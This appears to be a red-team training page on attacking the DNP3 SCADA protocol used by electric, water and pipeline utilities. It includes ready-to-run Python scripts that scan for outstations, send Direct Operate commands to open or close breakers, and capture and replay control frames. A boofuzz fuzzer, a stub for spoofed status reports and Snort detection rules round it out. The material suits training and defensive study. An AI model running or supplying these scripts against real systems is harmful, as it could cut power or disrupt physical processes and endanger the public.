---
layout: training-page
title: "DNP3 Protocol Attacks — Red Team Academy"
module: "OT/ICS Security"
tags:
  - dnp3
  - ics-protocols
  - scada-exploitation
  - electric-utility
page_key: "ot-ics-dnp3-attacks"
render_with_liquid: false
---

# DNP3 Protocol Attacks

DNP3 (Distributed Network Protocol 3) is the dominant SCADA communication protocol for electric utilities, water treatment facilities, and oil and gas pipelines in North America. It was designed in the early 1990s for unreliable serial communication between SCADA masters and remote outstations. Like Modbus, it was designed with zero security — no authentication in the base protocol, no encryption.

---

## DNP3 Protocol Primer

### Architecture

DNP3 uses a **master/outstation** model:

```
SCADA Master (Energy Management System / Control Center)
        │
        │  DNP3 request/response
        │  Port 20000 TCP or Serial
        │
   Outstation (RTU or IED in the field)
        │
        │  Direct wiring
        │
   Field Device (breaker, meter, sensor, pump)
```

**Masters**: Control center systems (GE EMS, OSIsoft PI, ABB SCADA)
**Outstations**: RTUs (Remote Terminal Units), IEDs (Intelligent Electronic Devices)

### Protocol Stack

DNP3 implements its own pseudo-ISO layer model:

```
Application Layer  ← Function codes, object groups, data objects
Transport Layer    ← Segmentation and reassembly of application fragments
Data Link Layer    ← CRC error detection, addressing (1-65519)
Physical Layer     ← RS-232/485 serial or TCP/UDP
```

### DNP3 Object Model

DNP3 organizes all data into **object groups** and **variations**:

| Group | Object Type | Example Variation |
|-------|-------------|-------------------|
| Group 1 | Binary Input | G1V1: Packed format, G1V2: with flags |
| Group 2 | Binary Input Change | G2V2: with absolute time |
| Group 10 | Binary Output Status | G10V2: output status with flags |
| Group 12 | Control Relay Output Block (CROB) | G12V1: CROB ← **ATTACK TARGET** |
| Group 20 | Counter | G20V5: 32-bit with flag |
| Group 30 | Analog Input | G30V5: 32-bit float |
| Group 40 | Analog Output Status | G40V3: 32-bit float |
| Group 41 | Analog Output Block | G41V3: 32-bit float ← **ATTACK TARGET** |

### Function Codes

```
FC01  (0x01): Read
FC02  (0x02): Write
FC03  (0x03): Select             ← Select-Before-Operate (SBO) sequence
FC04  (0x04): Operate            ← Execute after Select
FC05  (0x05): Direct Operate     ← Single-step control (no SBO) ← ATTACK VECTOR
FC06  (0x06): Direct Operate - No Ack
FC07  (0x07): Freeze
FC13  (0x0D): Cold Restart
FC14  (0x0E): Warm Restart
FC23  (0x17): Delay Measurement
FC129 (0x81): Response
FC130 (0x82): Unsolicited Response
```

---

## Wireshark Dissection of DNP3 Traffic

### Display Filters

```wireshark
# Show all DNP3 traffic
dnp3

# Filter by function code (Direct Operate = FC05)
dnp3.ctl.fc == 5

# Show only control messages (Groups 12, 41)
dnp3.ctl.fc == 5 or dnp3.ctl.fc == 3 or dnp3.ctl.fc == 4

# Filter by DNP3 source address
dnp3.src == 1

# Filter by destination address
dnp3.dst == 10

# Show unsolicited responses (outstation reporting events)
dnp3.ctl.fc == 0x82
```

### DNP3 Packet Anatomy

```
Ethernet Header
IP Header
TCP Header (port 20000)
├── DNP3 Data Link Frame:
│   ├── Start Bytes: 0x0564
│   ├── Length: 1 byte
│   ├── Control: 1 byte (DIR, PRM, FCB, FCV, FC)
│   ├── Destination Address: 2 bytes
│   ├── Source Address: 2 bytes
│   └── CRC: 2 bytes
├── DNP3 Transport Layer:
│   └── Control: 1 byte (FIR, FIN, sequence)
└── DNP3 Application Layer:
    ├── Control: 1 byte (FIR, FIN, CON, UNS, SEQ)
    ├── Function Code: 1 byte
    └── Objects: variable
        ├── Object Header (group, variation, qualifier, range)
        └── Object Data
```

### Example: Analyzing a CROB (Control Relay Output Block)

```bash
# Capture DNP3 traffic
tcpdump -i eth0 -w dnp3_capture.pcap port 20000

# Decode in tshark
tshark -r dnp3_capture.pcap -Y dnp3 -V | grep -A 20 "Direct Operate"

# Key fields to identify:
# dnp3.al.obj.g12v1.ctrl.code: 0x03 = LATCH_ON, 0x04 = LATCH_OFF
# dnp3.al.obj.g12v1.on_time: duration of ON in milliseconds
# dnp3.al.obj.g12v1.off_time: duration of OFF in milliseconds
# dnp3.al.obj.g12v1.count: number of times to repeat
```

---

## Enumeration

### Digital Bond Redpoint NSE Scripts

```bash
# Clone Redpoint repository
git clone https://github.com/digitalbond/Redpoint.git

# DNP3 enumeration with Redpoint
nmap -sV -p 20000 --script=./Redpoint/dnp3-info.nse <target>

# Example output:
# 20000/tcp open DNP3
# | dnp3-info:
# |   Master Address: 3
# |   Outstation Address: 1
# |   Device Restart IIN: False
# |   Config Corrupt IIN: False
# |_  Device Trouble IIN: False
```

### DNP3 Device Scan with Scapy

```python
#!/usr/bin/env python3
# dnp3_scan.py - Enumerate DNP3 outstations on a network
# Requires: pip install scapy

from scapy.all import *
import socket

def build_dnp3_read_class0(src_addr, dst_addr):
    """Build a DNP3 Class 0 data poll (reads all static data)"""
    # DNP3 Application layer: Read Class 0 data
    # FC01 (Read), Object Group 60, Variation 1 (Class 0 data)
    app_layer = bytes([
        0xC0,  # Application control: FIR, FIN, SEQ=0
        0x01,  # FC01: Read
        0x3C,  # Group 60
        0x01,  # Variation 1
        0x06,  # Qualifier 0x06: no range
    ])
    
    # Transport layer
    transport = bytes([0xC0])  # FIR=1, FIN=1, SEQ=0
    
    # Build full fragment
    fragment = transport + app_layer
    
    # Data link frame (without CRC for simplicity)
    dl_length = len(fragment) + 5
    data_link = bytes([
        0x05, 0x64,  # Start bytes
        dl_length,
        0x44,        # Control: DIR=1, PRM=1, FC=4 (User Data)
        dst_addr & 0xFF, (dst_addr >> 8) & 0xFF,
        src_addr & 0xFF, (src_addr >> 8) & 0xFF,
    ])
    
    return data_link + fragment

def probe_dnp3_outstation(ip, dst_addr=1, src_addr=3, port=20000):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        
        frame = build_dnp3_read_class0(src_addr, dst_addr)
        sock.send(frame)
        
        response = sock.recv(1024)
        if response and response[:2] == b'\x05\x64':
            print(f"[+] {ip} - DNP3 outstation {dst_addr} responded!")
            return True
        sock.close()
    except:
        pass
    return False

# Scan for outstations 1-10 on a target
target = "192.168.1.100"
for addr in range(1, 11):
    probe_dnp3_outstation(target, dst_addr=addr)
```

---

## Authentication Weaknesses

### Challenge-Response Authentication (Secure Authentication v2/v5)

DNP3 Secure Authentication was added as an optional extension (IEEE 1815-2012). Most deployed systems use no authentication at all. Where SA is deployed:

**SA v2 (Challenge-Response)**:
```
Master → Outstation: Challenge (random 4-byte nonce + HMAC-SHA1)
Outstation → Master: Reply (HMAC-SHA1 of challenge data + pre-shared key)
```

**Known Weaknesses in SA v2**:
1. **HMAC Downgrade**: Some implementations accept MD5 which can be bruteforced
2. **Replay Window**: Implementations with large replay windows allow old authenticated messages
3. **Key Negotiation**: Update Key exchange is vulnerable to MITM if not using asymmetric crypto
4. **No mutual authentication**: Master does not authenticate to outstation in v2

**SA v5 (IEEE 1815-2012 Amendment)**:
- Uses HMAC-SHA-256 minimum
- Mandatory asymmetric key management
- Still rarely deployed

### Exploiting No-Auth Deployments

The vast majority of DNP3 installations have no authentication. Any packet with correct DNP3 framing is accepted.

```bash
# Verify no authentication is required
# If you can send a Read and get a valid response, no auth
python3 -c "
import socket
sock = socket.socket()
sock.connect(('192.168.1.100', 20000))
# Minimal valid DNP3 read request (Class 0 poll)
frame = bytes.fromhex('0564 0544 0100 0300'.replace(' ','') + 'c001 3c01 06'.replace(' ',''))
sock.send(frame)
resp = sock.recv(256)
print('Response received:', resp.hex() if resp else 'No response')
"
```

---

## Spoofing Control Messages with Scapy

### Crafting a Direct Operate (FC05) Control Message

```python
#!/usr/bin/env python3
# dnp3_direct_operate.py
# Sends a DNP3 Direct Operate (FC05) CROB to control a binary output
# 
# WARNING: Only use in lab environment against test devices.
# Sending CROB to real substations can open/close breakers.

import socket
import struct

def compute_crc(data):
    """DNP3 CRC-16 computation"""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 1:
                crc = (crc >> 1) ^ 0xA6BC
            else:
                crc >>= 1
    return crc ^ 0xFFFF

def build_crob(point_index, control_code, on_time=100, off_time=100, count=1):
    """
    Build Control Relay Output Block (Group 12, Variation 1)
    control_code: 0x03 = LATCH_ON, 0x04 = LATCH_OFF,
                  0x41 = PULSE_ON, 0x42 = PULSE_OFF
    """
    # Object header: Group 12, Var 1, Qualifier 0x28 (1-byte count, 1-byte index)
    obj_header = bytes([0x0C, 0x01, 0x28, 0x01, point_index])
    
    # CROB data: control_code, count, on_time (32-bit), off_time (32-bit), status
    crob_data = struct.pack('<BBLLB', 
        control_code,  # Control code
        count,         # Count
        on_time,       # On time in ms
        off_time,      # Off time in ms
        0x00           # Status (0 = success, used in response)
    )
    
    return obj_header + crob_data

def send_direct_operate(ip, dst_addr, src_addr, point_index, control_code, port=20000):
    """
    Send DNP3 Direct Operate command to control binary output
    
    dst_addr: DNP3 address of target outstation (e.g., 1)
    src_addr: DNP3 address of our "master" (e.g., 3)  
    point_index: Binary output point index (0, 1, 2...)
    control_code: 0x03=LATCH_ON, 0x04=LATCH_OFF
    """
    crob = build_crob(point_index, control_code)
    
    # Application layer: FC05 (Direct Operate)
    app_control = 0xC0  # FIR=1, FIN=1, UNS=0, SEQ=0
    app_layer = bytes([app_control, 0x05]) + crob  # FC05
    
    # Transport layer
    transport = bytes([0xC0])  # FIR=1, FIN=1, SEQ=0
    
    fragment = transport + app_layer
    
    # Data link layer
    dl_len = len(fragment) + 5
    dl_header = struct.pack('<BBBBHH',
        0x05, 0x64,  # Start bytes
        dl_len,
        0x44,        # Control (DIR, PRM, User Data)
        dst_addr,
        src_addr
    )
    
    # Compute CRC for data link header
    dl_crc = compute_crc(dl_header[2:8])
    
    packet = dl_header + struct.pack('<H', dl_crc) + fragment
    
    print(f"[*] Sending Direct Operate to {ip}:{port}")
    print(f"    Target outstation: {dst_addr}")
    print(f"    Point index: {point_index}")
    print(f"    Control: {'LATCH_ON' if control_code == 0x03 else 'LATCH_OFF'}")
    
    sock = socket.socket()
    sock.settimeout(5)
    sock.connect((ip, port))
    sock.send(packet)
    
    resp = sock.recv(256)
    print(f"[+] Response received ({len(resp)} bytes): {resp.hex()}")
    
    # Parse response status byte from CROB echo
    if len(resp) > 20:
        status = resp[-2]  # Status byte in response CROB
        if status == 0:
            print("[+] Command SUCCESS - control executed")
        else:
            print(f"[-] Command returned status: 0x{status:02X}")
    
    sock.close()

# Example: Open breaker (LATCH_OFF) on outstation 1, point index 0
# ONLY USE IN LAB ENVIRONMENT
send_direct_operate("192.168.1.100", dst_addr=1, src_addr=3, 
                    point_index=0, control_code=0x04)
```

---

## Replay Attacks

### Capturing and Replaying Legitimate Control Sequences

Without authentication, captured DNP3 frames can be replayed verbatim:

```python
#!/usr/bin/env python3
# dnp3_replay.py
# Capture legitimate DNP3 control messages and replay them
from scapy.all import *
import socket
import time

def capture_dnp3_controls(interface, duration=60):
    """Capture DNP3 Direct Operate messages for later replay"""
    captured = []
    
    def packet_handler(pkt):
        if TCP in pkt and (pkt[TCP].dport == 20000 or pkt[TCP].sport == 20000):
            payload = bytes(pkt[TCP].payload)
            if len(payload) > 10 and payload[:2] == b'\x05\x64':
                # Check for Direct Operate (FC05) or Operate (FC04) in app layer
                # App layer starts after data link (10 bytes) + transport (1 byte)
                if len(payload) > 11:
                    fc = payload[11]  # Function code
                    if fc in [0x03, 0x04, 0x05]:  # Select, Operate, Direct Operate
                        print(f"[+] Captured control FC={fc:#04x}: {payload.hex()}")
                        captured.append({
                            'dst_ip': pkt[IP].dst,
                            'dport': pkt[TCP].dport,
                            'payload': payload,
                            'fc': fc
                        })
    
    print(f"[*] Capturing DNP3 controls on {interface} for {duration}s...")
    sniff(iface=interface, filter="tcp port 20000", 
          prn=packet_handler, timeout=duration)
    
    return captured

def replay_dnp3_sequence(captures, delay=0.1):
    """Replay captured DNP3 control messages"""
    for i, cap in enumerate(captures):
        print(f"[*] Replaying frame {i+1}/{len(captures)} (FC={cap['fc']:#04x})")
        try:
            sock = socket.socket()
            sock.settimeout(3)
            sock.connect((cap['dst_ip'], cap['dport']))
            sock.send(cap['payload'])
            resp = sock.recv(256)
            print(f"[+] Response: {resp.hex()[:40]}...")
            sock.close()
        except Exception as e:
            print(f"[-] Failed: {e}")
        time.sleep(delay)

# Capture for 60 seconds, then replay
caps = capture_dnp3_controls("eth0", duration=60)
if caps:
    print(f"\n[*] Captured {len(caps)} control messages. Replaying...")
    replay_dnp3_sequence(caps)
```

---

## Fuzzing DNP3 Implementations

### Using boofuzz for DNP3 Fuzzing

```python
#!/usr/bin/env python3
# dnp3_fuzz.py - DNP3 protocol fuzzer using boofuzz
# pip install boofuzz

from boofuzz import *
import socket

TARGET_IP = "192.168.1.100"
TARGET_PORT = 20000

def create_dnp3_session():
    session = Session(
        target=Target(
            connection=TCPSocketConnection(TARGET_IP, TARGET_PORT)
        ),
        sleep_time=0.5,
    )
    return session

def define_dnp3_request():
    s_initialize("dnp3_direct_operate")
    
    # Data Link Layer Header
    s_bytes(b'\x05\x64', name='start_bytes', fuzzable=False)
    s_byte(0x14, name='length', fuzzable=True)  # Fuzz length
    s_byte(0x44, name='dl_control', fuzzable=True)  # Fuzz control byte
    s_word(0x0001, name='dst_addr', endian='<', fuzzable=True)  # Fuzz address
    s_word(0x0003, name='src_addr', endian='<', fuzzable=False)
    s_bytes(b'\x00\x00', name='dl_crc', fuzzable=False)  # CRC
    
    # Transport + Application layers (fuzz FC and data)
    s_byte(0xC0, name='transport', fuzzable=False)
    s_byte(0xC0, name='app_control', fuzzable=True)
    s_byte(0x05, name='func_code', fuzzable=True)  # Fuzz function code
    
    # CROB object data
    s_bytes(b'\x0C\x01\x28\x01\x00', name='obj_header', fuzzable=True)
    s_bytes(b'\x03\x01\x64\x00\x00\x00\x64\x00\x00\x00\x00', 
            name='crob_data', fuzzable=True)

session = create_dnp3_session()
define_dnp3_request()
session.connect(s_get("dnp3_direct_operate"))
session.fuzz()
```

### Aegis DNP3 Fuzzer

```bash
# Aegis: Purpose-built DNP3 protocol fuzzer
# Download from: https://github.com/automatak/aegis
# (Commercial tool from Automatak, who discovered most DNP3 vulnerabilities)

# Achilles (Spirent): Commercial ICS protocol fuzzer
# Supports: Modbus, DNP3, IEC 61850, EtherNet/IP, OPC-UA

# For open source fuzzing, AFL++ with custom harness:
# Compile a DNP3 library with AFL instrumentation
CC=afl-clang-fast ./configure
make
afl-fuzz -i inputs/ -o findings/ ./dnp3_parser @@ 
```

---

## MITRE ATT&CK for ICS Techniques

### T0855 — Unauthorized Command Message

**Description**: Adversary sends unauthorized command messages to control system devices.

**DNP3 Application**: Sending Direct Operate (FC05) or Operate (FC04) CROB messages to an outstation without being authorized as a master.

```
Attack Chain:
Network Access → DNP3 device discovery → Sniff traffic for outstation addresses
→ Craft Direct Operate CROB → Send to outstation → Physical output changes
```

### T0856 — Spoof Reporting Message

**Description**: Adversary spoofs messages from a field device to the master to hide the true state of the process.

**DNP3 Application**: Injecting false unsolicited responses (FC130 = 0x82) from a spoofed outstation address to make the SCADA master believe everything is normal while the physical process is in an abnormal state.

```python
# Concept: Spoof an unsolicited response from outstation
# to maintain "normal" readings at SCADA master while
# actual process values have been manipulated

def build_spoofed_unsolicited_response(src_addr, master_addr, 
                                        analog_values):
    """
    Build a fake unsolicited response (FC130) with falsified analog data
    This would make the SCADA master display normal values
    even if the actual process is in alarm state
    """
    # Object: Group 30, Var 5 (32-bit float analog input)
    # FC130 (0x82): Unsolicited Response
    pass  # Implementation detail for lab exercise
```

### T0835 — Manipulate I/O Image

Manipulating the I/O image that a controller uses to update process outputs, without changing the actual process input values the controller reads.

### T0803 — Block Command Message

Denying the SCADA master the ability to send control commands by intercepting/dropping DNP3 packets while spoofing acknowledgments back to the master.

---

## Detection and Defense

### Network-Level Detection

```bash
# Zeek DNP3 analyzer generates logs at:
# /var/log/zeek/dnp3.log

# Fields in Zeek DNP3 log:
# ts, uid, id.orig_h, id.orig_p, id.resp_h, id.resp_p,
# fc_request, fc_reply, iin (Internal Indication bits)

# Alert on Direct Operate (FC05) from unexpected masters
# In Zeek policy:
# event dnp3_application_request_header if fc == 5 and ...
```

### Anomaly Detection Rules (Snort/Suricata)

```
# Snort rule: Alert on DNP3 Direct Operate
alert tcp any any -> any 20000 (
    msg:"DNP3 Direct Operate Command";
    content:"|05 64|"; offset:0; depth:2;  # DNP3 start bytes
    byte_test:1,=,0x05,11;                 # FC05 at offset 11
    sid:9000001; rev:1;
)

# Alert on DNP3 Cold Restart
alert tcp any any -> any 20000 (
    msg:"DNP3 Cold Restart Attempt";
    content:"|05 64|"; offset:0; depth:2;
    byte_test:1,=,0x0D,11;                 # FC13 = Cold Restart
    sid:9000002; rev:1;
)
```

---

*Next: [PLC Exploitation](plc-exploitation.md)*
